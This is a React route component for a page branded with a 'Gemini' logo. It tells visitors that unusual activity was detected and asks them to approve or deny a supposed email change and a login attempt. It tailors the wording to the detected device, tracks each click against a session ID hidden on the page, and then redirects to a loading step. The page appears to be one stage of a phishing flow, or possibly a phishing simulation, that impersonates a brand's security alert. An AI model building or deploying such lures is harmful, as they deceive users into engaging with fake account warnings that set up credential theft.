import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { GeminiLogo, GI_FONT_FAMILY, GiFontStyle, useGiTracking } from "@/components/gi/GiShared";

export const Route = createFileRoute("/gi/review")({
  head: () => ({ meta: [{ title: "Review your account" }] }),
  component: GiReviewPage,
});

function GiReviewPage() {
  const { trackClick, giNavigate, sessionId } = useGiTracking();
  const [email, setEmail] = useState("");
  const [device, setDevice] = useState("Your PC");
  const [time, setTime] = useState("");
  const [section1Choice, setSection1Choice] = useState<"approve" | "deny" | null>(null);
  const [section2Choice, setSection2Choice] = useState<"approve" | "deny" | null>(null);
  const [section1Hidden, setSection1Hidden] = useState(false);
  const [section2Hidden, setSection2Hidden] = useState(false);

  useEffect(() => {
    const ua = typeof navigator !== "undefined" ? navigator.userAgent : "";
    if (/iPhone/.test(ua)) setDevice("Your iPhone");
    else if (/iPad/.test(ua)) setDevice("Your iPad");
    else if (/Android/.test(ua)) setDevice("Your Android");
    else if (/Mac/.test(ua)) setDevice("Your Mac");
    else if (/Windows/.test(ua)) setDevice("Your PC");
    else setDevice("Your Device");
    setTime(new Date().toLocaleTimeString("en-US", { hour: "numeric", minute: "2-digit", hour12: true }));
    setEmail("user@example.com");
  }, []);

  useEffect(() => {
    if (section1Choice) {
      const t = setTimeout(() => setSection1Hidden(true), 400);
      return () => clearTimeout(t);
    }
  }, [section1Choice]);

  useEffect(() => {
    if (section2Choice) {
      const t = setTimeout(() => {
        setSection2Hidden(true);
        setTimeout(() => {
          trackClick(`Review Complete: ${section1Choice}/${section2Choice}`);
          giNavigate("/gi/loading");
        }, 500);
      }, 400);
      return () => clearTimeout(t);
    }
  }, [section2Choice]);

  const accent = "#000";
  return (
    <div style={{ minHeight: "100vh", display: "flex", flexDirection: "column", background: "#fff", color: "rgb(1,3,4)", fontFamily: GI_FONT_FAMILY }}>
      <GiFontStyle />
      <style>{`
        .gi-section { overflow: hidden; transition: max-height 0.4s ease, opacity 0.3s ease, margin 0.4s ease; max-height: 300px; opacity: 1; }
        .gi-section.hidden-s { max-height: 0; opacity: 0; margin-top: 0 !important; margin-bottom: 0 !important; }
        .gi-divider { transition: max-height 0.4s ease, opacity 0.3s ease, margin 0.4s ease; overflow: hidden; max-height: 40px; opacity: 1; }
        .gi-divider.hidden-s { max-height: 0; opacity: 0; margin: 0 !important; }
      `}</style>
      <header style={{ padding: "16px 24px" }}><GeminiLogo /></header>
      <main style={{ flex: 1, display: "flex", justifyContent: "center", alignItems: "flex-start", padding: "48px 24px 0" }}>
        <div style={{ width: "100%", maxWidth: 480, borderRadius: 16, padding: "40px 32px", border: "1px solid #e5e7eb" }}>
          <h1 style={{ fontSize: 24, fontWeight: 600, margin: 0, lineHeight: "32px" }}>Review your account</h1>
          <p style={{ fontSize: 14, color: "rgba(1,3,4,0.5)", marginTop: 8, lineHeight: "20px" }}>We have detected unusual activity on your account, please review these actions before continuing.</p>

          <div className={`gi-section ${section1Hidden ? "hidden-s" : ""}`} style={{ marginTop: 32 }}>
            <div style={{ fontSize: 14, fontWeight: 500 }}>Credential change</div>
            <p style={{ fontSize: 14, color: "rgba(1,3,4,0.5)", marginTop: 12, lineHeight: "20px" }}>We received a request to change the email address associated with your account to <span style={{ fontWeight: 500, color: "rgb(1,3,4)" }}>{email || "..."}</span>.</p>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12, marginTop: 20 }}>
              <button onClick={() => { if (!section1Choice) { setSection1Choice("approve"); trackClick("Review Section1 Approve"); } }} disabled={!!section1Choice} style={{ height: 48, borderRadius: 12, fontWeight: 500, fontSize: 16, border: "none", cursor: section1Choice ? "default" : "pointer", background: section1Choice === "deny" ? "#f3f4f6" : accent, color: section1Choice === "deny" ? "rgba(1,3,4,0.4)" : "#fff", opacity: section1Choice === "deny" ? 0.5 : 1 }}>Approve</button>
              <button onClick={() => { if (!section1Choice) { setSection1Choice("deny"); trackClick("Review Section1 Deny"); } }} disabled={!!section1Choice} style={{ height: 48, borderRadius: 12, fontWeight: 500, fontSize: 16, border: "none", cursor: section1Choice ? "default" : "pointer", background: section1Choice === "deny" ? "rgb(1,3,4)" : "#f3f4f6", color: section1Choice === "deny" ? "#fff" : section1Choice === "approve" ? "rgba(1,3,4,0.4)" : "rgb(1,3,4)", opacity: section1Choice === "approve" ? 0.5 : 1 }}>Deny</button>
            </div>
          </div>

          <div className={`gi-divider ${section1Hidden ? "hidden-s" : ""}`} style={{ borderTop: "1px solid #e5e7eb", margin: "32px 0" }} />

          <div className={`gi-section ${section2Hidden ? "hidden-s" : ""}`} style={{ marginTop: section1Hidden ? 32 : 0 }}>
            <div style={{ fontSize: 14, fontWeight: 500 }}>Attempted login</div>
            <p style={{ fontSize: 14, color: "rgba(1,3,4,0.5)", marginTop: 12, lineHeight: "20px" }}>We detected a login attempt to your account at <span style={{ fontWeight: 500, color: "rgb(1,3,4)" }}>{time || "just now"}</span>, from <span style={{ fontWeight: 500, color: "rgb(1,3,4)" }}>{device}.</span></p>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12, marginTop: 20 }}>
              <button onClick={() => { if (!section2Choice) { setSection2Choice("approve"); trackClick("Review Section2 Approve"); } }} disabled={!!section2Choice} style={{ height: 48, borderRadius: 12, fontWeight: 500, fontSize: 16, border: "none", cursor: section2Choice ? "default" : "pointer", background: section2Choice === "deny" ? "#f3f4f6" : accent, color: section2Choice === "deny" ? "rgba(1,3,4,0.4)" : "#fff", opacity: section2Choice === "deny" ? 0.5 : 1 }}>Approve</button>
              <button onClick={() => { if (!section2Choice) { setSection2Choice("deny"); trackClick("Review Section2 Deny"); } }} disabled={!!section2Choice} style={{ height: 48, borderRadius: 12, fontWeight: 500, fontSize: 16, border: "none", cursor: section2Choice ? "default" : "pointer", background: section2Choice === "deny" ? "rgb(1,3,4)" : "#f3f4f6", color: section2Choice === "deny" ? "#fff" : section2Choice === "approve" ? "rgba(1,3,4,0.4)" : "rgb(1,3,4)", opacity: section2Choice === "approve" ? 0.5 : 1 }}>Deny</button>
            </div>
          </div>
        </div>
      </main>
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">{sessionId}</div>
    </div>
  );
}
